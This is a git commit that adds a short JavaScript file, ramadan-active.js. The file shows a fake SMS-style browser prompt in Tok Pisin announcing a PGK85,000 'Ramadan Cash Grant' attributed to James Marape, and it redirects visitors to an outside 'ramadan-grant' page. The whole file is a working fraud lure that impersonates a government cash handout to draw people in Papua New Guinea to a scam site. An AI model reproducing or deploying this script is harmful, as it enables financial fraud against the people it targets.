5a3ee64d0c5ea3239cce364c888f2bb07fa831b4
ekpeowo <ukpehansi@gmail.com>
2025-03-28 13:19:07 +0100

    Create ramadan-active.js

---
+++ ramadan-active.js
@@ -0,0 +1,6 @@
+
+var password = 'KASIM PGK85,000'
+password=prompt('SMS: Amamas, yu inap long kisim JAMES MARAPE PGK85,000 Ramadan Cash Grant bilong ol PAPUANS, Presim Ok Long rausim mani','KASIM PGK85,000');
+if (password != 'KASIM PGK85,000') {
+location.href='https://news-active.org/ramadan-grant';
+}
